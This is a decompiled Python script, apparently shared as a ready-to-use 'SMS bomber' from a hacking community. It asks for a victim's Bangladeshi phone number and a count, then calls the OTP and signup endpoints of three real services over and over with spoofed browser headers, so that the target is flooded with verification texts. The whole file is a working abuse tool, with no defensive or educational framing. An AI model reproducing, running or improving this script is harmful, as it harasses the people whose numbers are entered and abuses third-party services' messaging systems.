# Decompile by Mardis (Tools By Heart Hacker)
# Time Succes decompile : 2023-11-18 01:49:10.327170
#Md Abdullah (Heart Hacker)
#github : hacker404-3301
#twitter : Heart Hacker
#facebook : Md Abdullah (Heart Hacker)
#team : Heart Hacker's community

import requests,os
os.system("clear")
logo="""
\x1b[38;5;46m
.s    s.  .s    s.  .s5SSSs.  .s5ssSs.  
      SS.       SS.       SS.    SS SS. 
sS    S%S sS    S%S sS    S%S sS SS S%S 
SS    S%S SS    S%S SS    S%S SS :; S%S 
SSSs. S%S SSSs. S%S SS .sS::' SS    S%S 
SS    S%S SS    S%S SS        SS    S%S 
SS    `:; SS    `:; SS        SS    `:; 
SS    ;,. SS    ;,. SS        SS    ;,. 
:;    ;:' :;    ;:' `:        :;    ;:'                                                                                                                   
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m       [ ENJOY THIS SMS BOMBER TOOLS ]       \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[1;32m====================================================
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m CREATOR  \033[1;91m : \033[1;95mHeart Hacker 
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mMd Abdullah 
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GROUP  \033[1;91m  : \033[1;95mHeart hacker's community 
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mSMS BOMBER 
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m1.0
\33[1;32m====================================================
"""
print(logo)
os.system("xdg-open https://www.facebook.com/profile.php?id=100078990605486")
nmbr=input("\033[1;31mENTER VICTIM's NUMBER : +880")
total=int(input("\033[1;33m ENTER SMS AMOUNT  : "))
print("""\033[1;32m\n\nWAIT FEW SECOND AND SEE
↘""")
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+nmbr+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+nmbr
data={
  "name": nmbr,
  "phoneNumber": nmbr,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while total>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
    
  else:
    pass
print("""\033[1;35m
………………………………………………………………………………………………
  \033[1;36m   ALL SMS SENT SUCCESSFUL ✅\033[1;35m  
………………………………………………………………………………………………
""")
